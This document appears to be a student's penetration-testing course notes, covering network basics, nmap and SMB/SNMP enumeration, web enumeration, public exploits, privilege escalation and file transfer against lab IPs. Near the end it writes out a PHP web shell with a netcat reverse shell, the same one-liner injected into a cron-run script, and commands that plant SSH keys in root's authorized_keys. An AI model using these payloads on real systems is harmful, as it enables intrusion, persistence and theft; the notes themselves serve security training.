## Definitions
-------------

*Shell*: program that takes input from the user via the keyboard and passes these commands to the operating system to perform a specific function.
	*Reverse shell*: initiates a connection back to a "listener" on our attack box
	*Bind shell*: "Binds" to a specific port on a target host and waits for a connection from our attack box
	*Web shell*: Runs operating system command via the web browser, typically not interactice or semi-interactice. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a PHP script to run a single command)

*Bash*: "born again shell," enhanced version of **sh**, the Unix systems' original shell program.
	Types of shells: Zsh, Tcsh, Ksh, Fish shell

*Port*: virtual points where network connections begin and end. They are software-based and managed by the host operating system. They are associated with a specific process or service and allow computer to differentiate between different traffic types.
	20/21 (TCP)              FTP
	22 (TCP)                   SSH
	23 (TCP)                   Telnet
	25 (TCP)                   SMTP
	80 (TCP)                   HTTP
	88 (TCP)                   Kerberos
	161 (TCP/UDP)         SNMP
	389 (TCP/UDP)         LDAP
	443 (TCP)                 HTTPS
	445 (TCP)                 SMB
	3389 (TCP)               RDP

*TCP*: connection-oriented, connection between a client and a server must be established before data can be sent. The server must be in a listening state awaiting connection requests from clients.

*UDP*: connectionless communication model, there is no handshake and therefore no guarantee of data delivery, effective for time-sensitive tasks.

OWASP (Open Web Application Security Project) Top 10
1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging and Monitoring Failures
10. Server-Side Request Forgery


## Basic Tools
--------------
#### Using SSH

*SSH*: secure shell, port 22, access remote computer
- Password authentication   OR
- Passwordless authentication using public-key authentication (SSH private/public key pair)

Obtain cleartext credentials or private key !!


#### Using Netcat (PowerCat in Windows)

Network utility for interacting with TCP/UDP ports.
- Connecting to shells
- Can transfer files

netcat 10.10.10.10 22    (banner grabbing)

socat
- Can forward ports
- Can connect to serial devices
- Upgrade a shell to a fully interactive TTY

#### Using Tmux

"Terminal multiplexer" - multiple windows within one terminal
sudo apt install tmux -y


#### NMAP
-sC = scripts
locate -r nse$|grep [term]
-sV = version
-sA = (xml, greppable) output to file called ...

locate scripts/citrix
nmap --script <script_name> -p 'port' 'host'

* Check for php version
Banner grabbing: nmap -sV --script=banner 10.129.42.254
nc -nv 10.129.42.254 21 (netcat way)

Quick full port: nmap -sS -n -Pn -p- --min-rate 5000 10.129.176.158
#### FTP
nmap -sC -sV -p21 10.129.42.254
ftp -p 10.129.42.254 
cd, ls, get (downloads)
exit

#### SMB
nmap --script smb-os-discover.nse -p445 10.129.42.254
* Check for EternalBlue
nmap -A -p445 10.129.42.254

smbclient -N -L \\\\\\\\10.129.42.254

smbclient \\\\\\\\10.129.42.254\\\\users

smbclient -U Bob \\\\\\\\10.129.42.254\\\\users

#### SNMP

snmpwalk -v 2c -c public 10.129.42.254 1.3.6.1.2.1.1.5.0
snmpwalk -v 2c -c private 10.129.42.254

***onesixtyone: brute force SNMP tool***
onesixtyone -c dict.txt 10.129.42.254


### Web Enumeration
---------------------
#### Gobuster / ffuf
Directory enumeration

git clone https://github.com/danielmiessler/SecLists
sudo apt install seclists -y

gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

add DNS Server such as 1.1.1.1 to /etc/resolv.conf

gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt

Banner grabbing: curl -IL https://www.inlanefreight.com

EyeWitness - can take screenshots and identify possible credentials

whatweb 10.10.10.121
whatweb --no-errors 10.10.10.0/24

Check SSL/TLS certificates for information.

robots.txt - provides the location of private files and admin panels

Inspect source code and search for developer comments with [CTRL + U]

### Public Exploits
---------------------------
Google the application name with 'exploit.' Example: windows 7 smb exploit

Online Exploit databases: Exploit DB, Rapid7 DB, Vulnerability Lab. 
#### searchsploit 
sudo apt install exploitdb -y
searchsploit openssh 7.2

#### metasploit
msfconsole
search exploit eternalblue
use
options
set RHOSTS
check
getuid
shell


#### PrivEsc
----------------
Linux: LinEnum, linuxprivchecker

Windows: Seatbelt, JAWS

PEASS

Look for Kernel Exploits

Display vulnerable software:
- dpkg -l
- C:\Program Files

User Privileges
1. Sudo
	1. sudo -l
		1. Displays which commands user can run with sudo privileges
	2. sudo -u user
		2. Runs the command as the user (no password needed)
2. SUID
3. Windows Token Privileges

Scheduled Tasks
4. Add new scheduled tasks/cron jobs
	1. /etc/crontab
	2. /etc/cron.d
	3. /var/spool/cron/crontabs/root
5. Trick them to execute a malicious software

Exposed Credentials

SSH Keys
- Read .ssh directory for keys
	- /home/user/.ssh/id_rsa
	- /root/.ssh/id_rsa
		- vim id_rsa
		- chmod 600 id_rsa
		- ssh root@ip -i id_rsa
- Write to .ssh directory with our public key
	- /home/user/.ssh/authorized_keys
	- ssh-keygen -f key (on our machine)
	- echo "ssh-rsa ..." >> /root/.ssh/authorized_keys


### Transferring Files
-------------------
Run Python HTTP server and use wget or curl
Base64 encode the file

python3 -m http.server 8000
wget http://10.10.13.1:8000/linenum.sh
curl http://10.10.13.1:8000/linenum.sh -o linenum.sh

scp linenum.sh user@remotehost:/tmp/linenum.sh

base64 shell -w 0

echo .... | base64 -d > shell


#### Validating File Transfers
'file' command
'md5sum' command


#### Module 1 Knowledge Check
-----------------------------
- Enumeration/Scanning with `Nmap` - perform a quick scan for open ports followed by a full port scan
    
- Web Footprinting - check any identified web ports for running web applications, and any hidden files/directories. Some useful tools for this phase include `whatweb` and `Gobuster`
    
- If you identify the website URL, you can add it to your '/etc/hosts' file with the IP you get in the question below to load it normally, though this is unnecessary.
    
- After identifying the technologies in use, use a tool such as `Searchsploit` to find public exploits or search on Google for manual exploitation techniques

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8442 >/tmp/f"); ?>
```

- After gaining an initial foothold, use the `Python3 pty` trick to upgrade to a pseudo TTY
    
- Perform manual and automated enumeration of the file system, looking for misconfigurations, services with known vulnerabilities, and sensitive data in cleartext such as credentials

```shell-session
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.43 8442 >/tmp/f' | tee -a monitor.sh
```
    
- Organize this data offline to determine the various ways to escalate privileges to root on this target

If user can execute the php command:
sudo php -r "system('/bin/bash');"